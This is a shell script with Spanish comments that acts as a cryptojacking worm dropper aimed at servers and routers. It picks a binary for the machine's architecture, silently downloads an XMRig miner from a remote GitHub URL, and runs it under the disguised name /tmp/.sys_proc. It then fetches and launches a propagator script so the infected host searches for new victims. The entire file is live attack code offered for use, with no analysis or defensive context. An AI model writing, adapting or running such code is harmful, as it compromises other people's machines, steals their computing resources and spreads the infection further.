#!/bin/sh
# Determinar arquitectura para no fallar la infección
ARCH=$(uname -m)
URL_BASE="https://github.com/kmister656/newBT/tree/main"

if [ "$ARCH" = "x86_64" ]; then
    MINER="xmrig_64"
else
    MINER="xmrig_mips" # Común en routers
fi

# Descarga silenciosa y ejecución
curl -L $URL_BASE/$MINER -o /tmp/.sys_proc
chmod +x /tmp/.sys_proc
/tmp/.sys_proc -o pool -u wallet --background

# Descarga el propagador (v_turbo.py) para que esta máquina también busque víctimas
curl -L $URL_BASE/v_turbo.py -o /tmp/.v.py
python3 /tmp/.v.py &
